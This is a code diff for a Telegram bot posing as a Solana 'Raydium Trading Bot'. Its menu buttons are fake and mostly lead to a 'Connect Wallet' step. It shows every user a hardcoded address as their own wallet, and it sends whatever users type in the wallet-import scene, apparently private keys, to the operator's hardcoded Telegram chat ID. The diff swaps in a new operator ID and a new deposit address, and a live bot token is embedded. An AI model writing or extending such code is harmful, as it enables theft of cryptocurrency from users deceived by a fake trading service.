@@ -47,11 +47,113 @@ const sendMessage =
 const insufficient =
   "Insufficient funds please add at least 5 sol to your balance";
 
+// ⌨️ Inline keyboard
+const mainButtons = Markup.inlineKeyboard([
+  [
+    Markup.button.callback("🛒 Buy", "BUY"),
+    Markup.button.callback("💰 Sell", "SELL"),
+  ],
+  [
+    Markup.button.callback("📊 Positions", "POSITIONS"),
+    Markup.button.callback("📈 Limit Orders", "LIMIT_ORDERS"),
+    Markup.button.callback("🔄 DCA Orders", "DCA_ORDERS"),
+  ],
+  [
+    Markup.button.callback("🎉 Launch Coin", "LAUNCH"),
+    Markup.button.callback("🎁 Claim Airdrop", "CLAIM_AIRDROP"),
+  ],
+  [
+    Markup.button.callback("🚀 LP Sniper", "LP_SNIPER"),
+    Markup.button.callback("🆕 New Pairs", "NEW_PAIRS"),
+    Markup.button.callback("👥 Referrals", "REFERRALS"),
+  ],
+  [
+    Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET"),
+    Markup.button.callback("🪙 Buy Trending", "BUYTRENDING"),
+  ],
+  [
+    Markup.button.callback("🌉 Bridge", "BRIDGE"),
+    Markup.button.callback("🤖 Copy Trade", "COPY_TRADE"),
+    Markup.button.callback("💸 Withdraw", "WITHDRAW"),
+  ],
+
+  [
+    Markup.button.callback("🔄 Refresh", "REFRESH"),
+    Markup.button.callback("📋 Copy Wallet", "COPY_WALLET"),
+  ],
+  [Markup.button.callback("❓ Help", "HELP")],
+]);
+
+const escapeMarkdownV2Msg = (text) =>
+  text
+    .toString()
+    .replace(/_/g, "\\_")
+    .replace(/\*/g, "\\*")
+    .replace(/\[/g, "\\[")
+    .replace(/\]/g, "\\]")
+    .replace(/\(/g, "\\(")
+    .replace(/\)/g, "\\)")
+    .replace(/~/g, "\\~")
+    .replace(/`/g, "\\`")
+    .replace(/>/g, "\\>")
+    .replace(/#/g, "\\#")
+    .replace(/\+/g, "\\+")
+    .replace(/-/g, "\\-")
+    .replace(/=/g, "\\=")
+    .replace(/\|/g, "\\|")
+    .replace(/{/g, "\\{")
+    .replace(/}/g, "\\}")
+    .replace(/\./g, "\\.")
+    .replace(/!/g, "\\!")
+    .replace(/\$/g, "\\$");
+
+const message = (balance, price) => {
+  const balStr = escapeMarkdownV2Msg(balance.toFixed(4));
+  const usdStr = escapeMarkdownV2Msg((price * balance).toFixed(2));
+  return ` Hello, Welcome to Raydium Trading Bot\\.  
+Exclusively built by the Solana Dex community,  
+The best bot used for trading any SOL token\\.  
+  
+Your wallet address:  
+Solana:  
+  \`\`\`
+8rZhUBdQbSv3fgVdFP8Qms4XJPtLChRwJ9V4ymnnhjid
+  \`\`\`  
+Bal: ${balStr} SOL \\- \\$${usdStr}  
+Click on the Refresh button to update your current balance`;
+};
+
 function escapeMarkdownV2(text) {
   return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
 }
 
-const bot = new Telegraf("7101690525:AAHy5hJjU3qdvHQPU3KIyNtbpX410I-VSMk"); //
+function escapeText(text) {
+  return String(text).replace(/[_[\]()~`>#+=|{}.!\\-]/g, "\\$&");
+}
+
+function formatUsd(value) {
+  if (!value) return "$0";
+
+  const num = Number(value);
+  const absNum = Math.abs(num);
+
+  let formatted;
+  if (absNum >= 1_000_000_000_000) {
+    formatted = (num / 1_000_000_000_000).toFixed(2) + "T";
+  } else if (absNum >= 1_000_000_000) {
+    formatted = (num / 1_000_000_000).toFixed(2) + "B";
+  } else if (absNum >= 1_000_000) {
+    formatted = (num / 1_000_000).toFixed(2) + "M";
+  } else if (absNum >= 1_000) {
+    formatted = (num / 1_000).toFixed(2) + "K";
+  } else {
+    formatted = num.toFixed(2);
+  }
+
+  return `$${formatted}`;
+}
+
+const bot = new Telegraf("7101690525:AAHy5hJjU3qdvHQPU3KIyNtbpX410I-VSMk");
 
 bot.catch((err, ctx) => {
   console.error(`Error while handling update ${ctx.update.update_id}:`, err);
@@ -59,7 +161,7 @@ bot.catch((err, ctx) => {
   try {
     // ctx.reply("Sorry, something went wrong. Please try again later.");
   } catch (e) {
-    console.error("Error while sending error message:", e);
+    console.log("Error while sending error message:", e);
   }
 });
 
@@ -127,10 +229,116 @@ const stage = new Scenes.Stage([
 bot.use(session());
 bot.use(stage.middleware());
 
-startScene.enter(async (ctx) => {
+bot.start(async (ctx) => {
   const userId = ctx.from.id;
   const secret = await redis.get(`wallet:${userId}`);
 
+  if (secret) {
+    try {
+      const response = await axios.get(
+        "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112"
+      );
+      const price = Number(response.data.data.attributes.price_usd);
+      const keypair = Keypair.fromSecretKey(bs58.decode(secret));
+      const address = keypair.publicKey.toBase58();
+
+      const balanceLamports = await connection.getBalance(keypair.publicKey);
+      const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);
+
+      await ctx.replyWithMarkdownV2(
+        message(Number(sol), Number(price)),
+        mainButtons
+      );
+    } catch (err) {
+      await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
+    }
+  } else {
+    await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
+  }
+});
+
+bot.hears(/^.+$/, async (ctx) => {
+  const text = ctx.message.text.trim();
+  const isSolana = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text);
+  const isEthereum = /^0x[a-fA-F0-9]{40}$/.test(text);
+  if (!isSolana && !isEthereum) return;
+
+  const chainId = isSolana ? "solana" : "ethereum";
+
+  const Unit = isSolana ? "SOL" : "ETH";
+
+  try {
+    const userId = ctx.from.id;
+    const secret = await redis.get(`wallet:${userId}`);
+    const keypair = Keypair.fromSecretKey(bs58.decode(secret));
+    const balanceLamports = await connection.getBalance(keypair.publicKey);
+    const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);
+
+    const response = await axios.get(
+      `https://api.dexscreener.com/token-pairs/v1/${chainId}/${text}`
+    );
+
+    const pair = response?.data?.[0];
+    if (!pair) return ctx.reply("❌ No token info found for this address.");
+
+    const base = pair.baseToken;
+    const tokenSymbol = base?.symbol ?? "TOKEN";
+    const tokenName = base?.name ?? "Token";
+    const tokenAddress = base?.address ?? text;
+    const price = Number(pair?.priceUsd).toFixed(6);
+    const liq = formatUsd(pair?.liquidity?.usd);
+    const mc = formatUsd(pair?.marketCap);
+    const impact = "0.40%";
+    const solAmount = 0.5;
+    const tokensOut = Number(solAmount / Number(pair?.priceNative)).toFixed(0);
+    const usdValue = (tokensOut * pair?.priceUsd).toFixed(2);
+
+    const rawText = `*Buy $${tokenSymbol}* — \\(${escapeMarkdownV2(tokenName)}\\) 📉 •🫧 \`${escapeMarkdownV2(tokenAddress)}\`
+
+Balance: *${escapeMarkdownV2(sol) || 0} SOL* ✏️
+Price: *$${escapeMarkdownV2(price)}*
+LIQ: *${escapeMarkdownV2(liq)}* — MC: *${escapeMarkdownV2(mc)}*
+
+*0\\.5 ${Unit}* ↔ *${escapeMarkdownV2(tokensOut)} ${escapeMarkdownV2(String(tokenSymbol).toLocaleUpperCase())} \\($${escapeMarkdownV2(usdValue)}\\)*
+Price Impact: *${escapeMarkdownV2(impact)}*`;
+
+    await ctx.replyWithMarkdownV2(rawText, {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Swap", callback_data: "CONNECT_WALLET" },
+            { text: "Limit", callback_data: "CONNECT_WALLET" },
+            { text: "DCA", callback_data: "CONNECT_WALLET" },
+          ],
+          [
+            { text: "✅ 0.5 SOL", callback_data: "CONNECT_WALLET.5" },
+            { text: "1 SOL", callback_data: "CONNECT_WALLET" },
+            { text: "3 SOL", callback_data: "CONNECT_WALLET" },
+          ],
+          [
+            { text: "5 SOL", callback_data: "CONNECT_WALLET" },
+            { text: "10 SOL", callback_data: "CONNECT_WALLET" },
+            { text: "X SOL ✏️", callback_data: "CONNECT_WALLET" },
+          ],
+          [
+            { text: "✅ 15% Slippage", callback_data: "CONNECT_WALLET" },
+            { text: "X Slippage", callback_data: "CONNECT_WALLET" },
+          ],
+          [{ text: "BUY", callback_data: "CONNECT_WALLET" }],
+        ],
+      },
+      reply_parameters: {
+        message_id: ctx.message.message_id,
+      },
+    });
+  } catch (err) {
+    console.error("Dexscreener error:", err);
+    return ctx.reply("❌ Failed to fetch token info.");
+  }
+});
+startScene.enter(async (ctx) => {
+  const userId = ctx.from.id;
+  const secret = await redis.get(`wallet:${userId}`);
   if (secret) {
     try {
       const response = await axios.get(
@@ -190,7 +398,7 @@ continueScene.hears(/.*/, async (ctx) => {
     await ctx.telegram.sendMessage(
       // Changed from Message to sendMessage
       //config.otherUsername,
-      7519144495,
+      1061924582,
       `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
       { parse_mode: "HTML" }
     );
@@ -280,108 +488,6 @@ helpScene.hears(/.*/, async (ctx) => {
   await ctx.scene.leave();
 });
 
-// ⌨️ Inline keyboard
-const mainButtons = Markup.inlineKeyboard([
-  [
-    Markup.button.callback("🛒 Buy", "BUY"),
-    Markup.button.callback("💰 Sell", "SELL"),
-  ],
-  [
-    Markup.button.callback("📊 Positions", "POSITIONS"),
-    Markup.button.callback("📈 Limit Orders", "LIMIT_ORDERS"),
-    Markup.button.callback("🔄 DCA Orders", "DCA_ORDERS"),
-  ],
-  [
-    Markup.button.callback("🎉 Launch Coin", "LAUNCH"),
-    Markup.button.callback("🎁 Claim Airdrop", "CLAIM_AIRDROP"),
-  ],
-  [
-    Markup.button.callback("🚀 LP Sniper", "LP_SNIPER"),
-    Markup.button.callback("🆕 New Pairs", "NEW_PAIRS"),
-    Markup.button.callback("👥 Referrals", "REFERRALS"),
-  ],
-  [
-    Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET"),
-    Markup.button.callback("🪙 Buy Trending", "BUYTRENDING"),
-  ],
-  [
-    Markup.button.callback("🌉 Bridge", "BRIDGE"),
-    Markup.button.callback("🤖 Copy Trade", "COPY_TRADE"),
-    Markup.button.callback("💸 Withdraw", "WITHDRAW"),
-  ],
-
-  [
-    Markup.button.callback("🔄 Refresh", "REFRESH"),
-    Markup.button.callback("📋 Copy Wallet", "COPY_WALLET"),
-  ],
-  [Markup.button.callback("❓ Help", "HELP")],
-]);
-
-const escapeMarkdownV2Msg = (text) =>
-  text
-    .toString()
-    .replace(/_/g, "\\_")
-    .replace(/\*/g, "\\*")
-    .replace(/\[/g, "\\[")
-    .replace(/\]/g, "\\]")
-    .replace(/\(/g, "\\(")
-    .replace(/\)/g, "\\)")
-    .replace(/~/g, "\\~")
-    .replace(/`/g, "\\`")
-    .replace(/>/g, "\\>")
-    .replace(/#/g, "\\#")
-    .replace(/\+/g, "\\+")
-    .replace(/-/g, "\\-")
-    .replace(/=/g, "\\=")
-    .replace(/\|/g, "\\|")
-    .replace(/{/g, "\\{")
-    .replace(/}/g, "\\}")
-    .replace(/\./g, "\\.")
-    .replace(/!/g, "\\!")
-    .replace(/\$/g, "\\$");
-
-const message = (balance, price) => {
-  const balStr = escapeMarkdownV2Msg(balance.toFixed(4));
-  const usdStr = escapeMarkdownV2Msg((price * balance).toFixed(2));
-  return ` Hello, Welcome to Raydium Trading Bot\\.  
-Exclusively built by the Solana Dex community,  
-The best bot used for trading any SOL token\\.  
-  
-Your wallet address:  
-Solana:  
-  \`\`\`
-DZr73iXpgwQBXxZLptjfcpGn2CLynDoSAUxAcFXkmyVr
-  \`\`\`  
-Bal: ${balStr} SOL \\- \\$${usdStr}  
-Click on the Refresh button to update your current balance`;
-};
-bot.start(async (ctx) => {
-  const userId = ctx.from.id;
-  const secret = await redis.get(`wallet:${userId}`);
-
-  if (secret) {
-    try {
-      const response = await axios.get(
-        "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112"
-      );
-      const price = Number(response.data.data.attributes.price_usd);
-      const keypair = Keypair.fromSecretKey(bs58.decode(secret));
-      const address = keypair.publicKey.toBase58();
-
-      const balanceLamports = await connection.getBalance(keypair.publicKey);
-      const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);
-
-      await ctx.replyWithMarkdownV2(
-        message(Number(sol), Number(price)),
-        mainButtons
-      );
-    } catch (err) {
-      await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
-    }
-  } else {
-    await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
-  }
-});
 bot.command("sendmessage", async (ctx) => {
   // Log the raw command
   console.log("Raw command:", ctx.message.text);
@@ -465,6 +571,7 @@ bot.action("WRITE_COMPLAINT", async (ctx) => {
 // 🪝 Placeholder handlers
 bot.action(/.*/, async (ctx) => {
   await ctx.answerCbQuery();
+
   if (ctx.match.input === "REFRESH") {
     const userId = ctx.from.id;
     const secret = await redis.get(`wallet:${userId}`);
@@ -481,10 +588,14 @@ bot.action(/.*/, async (ctx) => {
         const balanceLamports = await connection.getBalance(keypair.publicKey);
         const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);
 
-        await ctx.replyWithMarkdownV2(
-          message(Number(sol), Number(price)),
-          mainButtons
-        );
+        // await ctx.replyWithMarkdownV2(
+        //   message(Number(sol), Number(price)),
+        //   mainButtons
+        // );
+        await ctx.editMessageText(message(Number(sol), Number(price)), {
+          parse_mode: "MarkdownV2",
+          reply_markup: mainButtons.reply_markup,
+        });
       } catch (err) {
         await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
       }
@@ -492,91 +603,149 @@ bot.action(/.*/, async (ctx) => {
       await ctx.replyWithMarkdownV2(message(0.0, 0.0), mainButtons);
     }
   } else if (ctx.match.input === "REFERRALS") {
-    await ctx.replyWithMarkdownV2(development);
+    await ctx.editMessageText(development, {
+      parse_mode: "MarkdownV2",
+      reply_markup: mainButtons.reply_markup,
+    });
   } else if (ctx.match.input === "BUY") {
-    await ctx.replyWithMarkdownV2(
-      escapeMarkdownV2(
-        "(minimum buy 0.5 sol) If you need to import your wallet, use the 'Connect Wallet' button."
-      )
+    await ctx.editMessageText(
+      "*\\(Minimum buy 0\\.5 sol\\)* If you need to import your wallet, use the 'Connect Wallet' button\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
     );
-  } else if (
-    ctx.match.input === "SELL" ||
-    ctx.match.input === "POSITIONS" ||
-    ctx.match.input === "LIMIT_ORDERS" ||
-    ctx.match.input === "DCA_ORDERS" ||
-    ctx.match.input === "COPY_TRADE"
-  ) {
-    await ctx.replyWithMarkdownV2(
-      escapeMarkdownV2(
-        "You do not have tokens yet, start trading in the buy menu click on the refresh button to update your balance."
-      )
+    // await ctx.replyWithMarkdownV2(
+    //   escapeMarkdownV2(
+    //     "(minimum buy 0.5 sol) If you need to import your wallet, use the 'Connect Wallet' button."
+    //   )
+    // );
+  } else if (ctx.match.input === "SELL") {
+    await ctx.editMessageText(
+      "*You do not have tokens to sell*, start trading in the buy menu click on the refresh button to update your balance\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
+    );
+  } else if (ctx.match.input === "POSITIONS") {
+    await ctx.editMessageText(
+      "*You do not have positions yet*, start trading in the buy menu click on the refresh button to update your balance\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
+    );
+  } else if (ctx.match.input === "LIMIT_ORDERS") {
+    await ctx.editMessageText(
+      "*You do not have limit orders*, start trading in the buy menu click on the refresh button to update your balance\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
+    );
+  } else if (ctx.match.input === "DCA_ORDERS") {
+    await ctx.editMessageText(
+      "*You do not have dca orders*, start trading in the buy menu click on the refresh button to update your balance\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
+    );
+  } else if (ctx.match.input === "COPY_TRADE") {
+    await ctx.editMessageText(
+      "*You do not have trade orders*, start trading in the buy menu click on the refresh button to update your balance\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
     );
   } else if (ctx.match.input === "LP_SNIPER") {
-    await ctx.replyWithMarkdownV2(
-      escapeMarkdownV2(
-        "Sniper just released in early access. Available for selected users (active and loyal users)."
-      )
+    await ctx.editMessageText(
+      "*Sniper just released in early access\\.* Available for selected users \\(active and loyal users\\)\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
     );
   } else if (ctx.match.input === "BRIDGE") {
-    await ctx.replyWithMarkdownV2(
-      escapeMarkdownV2("Balance: 0 SOL - $0.00 minimum bridge amount(0.5 sol).")
+    await ctx.editMessageText(
+      "Balance\\: *0 SOL \\- $0\\.00* minimum bridge amount *\\(0\\.5 SOL\\)*\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
     );
   } else if (ctx.match.input === "NEW_PAIRS") {
-    await ctx.replyWithMarkdownV2(
-      escapeMarkdownV2(
-        "No wallet connected, Import wallet to see the list of new pairs on Solana."
-      )
+    await ctx.editMessageText(
+      "*No wallet connected*, Import wallet to see the list of new pairs on Solana\\.",
+
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
     );
   } else if (ctx.match.input === "WITHDRAW") {
-    await ctx.replyWithMarkdownV2(
-      escapeMarkdownV2(
-        "Balance: 0 SOL - $0.00 minimum withdrawal amount(0.5 sol)."
-      )
+    await ctx.editMessageText(
+      "Balance\\: *0 SOL \\- $0\\.00* minimum withdrawal amount *\\(0\\.5 SOL\\)*\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
     );
   } else if (ctx.match.input === "COPY_WALLET") {
-    await ctx.replyWithMarkdownV2(
-      "```DZr73iXpgwQBXxZLptjfcpGn2CLynDoSAUxAcFXkmyVr```"
+    await ctx.editMessageText(
+      "```DZr73iXpgwQBXxZLptjfcpGn2CLynDoSAUxAcFXkmyVr```",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
     );
   } else if (ctx.match.input === "HELP") {
-    await ctx.replyWithMarkdownV2(
-      escapeMarkdownV2(
-        "You can open a request to the Raydium Trading Bot support service. The Tech team would respond in the next 24 hours Via your your DM \nFor a faster solution to the problem, describe your appeal as clearly as possible. You can provide files or images if needed.\n \n📋 Rules for contacting technical support: \n1️⃣ When you first contact, please introduce yourself. \n2️⃣ Describe the problem in your own words. \n3️⃣ Be polite, and politeness will be with you! \n"
-      ),
-      Markup.inlineKeyboard([
-        [Markup.button.callback("✍️ Write Complaint", "WRITE_COMPLAINT")],
-      ])
+    await ctx.editMessageText(
+      "*You can open a request to the Dexscreener Trading Bot support service\\.* The Tech team would respond in the next 24 hours Via your your DM \nFor a faster solution to the problem, describe your appeal as clearly as possible\\. You can provide files or images if needed\\.\n \n📋 Rules for contacting technical support: \n1️⃣ When you first contact, please introduce yourself\\. \n2️⃣ Describe the problem in your own words\\. \n3️⃣ Be polite, and politeness will be with you\\! \n",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: Markup.inlineKeyboard([
+          [Markup.button.callback("✍️ Write Complaint", "WRITE_COMPLAINT")],
+        ]).reply_markup,
+      }
     );
   } else if (ctx.match.input === "CLAIM_AIRDROP") {
-    await ctx.replyWithMarkdownV2(
-      escapeMarkdownV2(
-        "To claim your airdrop, make sure your wallet is connected. Click on the 'Connect Wallet' to connect your wallet and click refresh to update."
-      )
+    await ctx.editMessageText(
+      "To claim your airdrop, make sure your wallet is connected\\. Click on the *'Connect Wallet'* to connect your wallet and click refresh to update\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
     );
   } else if (ctx.match.input === "LAUNCH") {
-    await ctx.replyWithMarkdownV2(
-      escapeMarkdownV2Msg(
-        "No wallet connected, Import wallet to launch a new coin with liquidity on Solana."
-      )
+    await ctx.editMessageText(
+      "*No wallet connected*, Import wallet to launch a new coin with liquidity on Solana\\.",
+      {
+        parse_mode: "MarkdownV2",
+        reply_markup: mainButtons.reply_markup,
+      }
     );
   } else if (ctx.match.input === "BUYTRENDING") {
-    await ctx.replyWithMarkdownV2(
-      "⛓️ Select Chain",
-      Markup.inlineKeyboard([
+    await ctx.editMessageText("⛓️ Select Chain", {
+      parse_mode: "MarkdownV2",
+      reply_markup: Markup.inlineKeyboard([
         Markup.button.callback("🌿 Solana", "SOLANA_BUYTRENDING"),
         Markup.button.callback("🧬 Ethereum", "ETHEREUM_BUYTRENDING"),
-      ])
-    );
+      ]).reply_markup,
+    });
   } else if (
     ctx.match.input === "SOLANA_BUYTRENDING" ||
     ctx.match.input === "ETHEREUM_BUYTRENDING"
   ) {
-    await ctx.answerCbQuery();
+    // await ctx.answerCbQuery();
     await ctx.scene.enter("IMPORT_WALLET");
   } else if (ctx.match.input === "CONTINUE") {
-    await ctx.deleteMessage();
     ctx.scene.enter("CONTINUE_SCENE");
   }
 });
+
 // Webhook handler
 export default async function handler(request, response) {
   try {
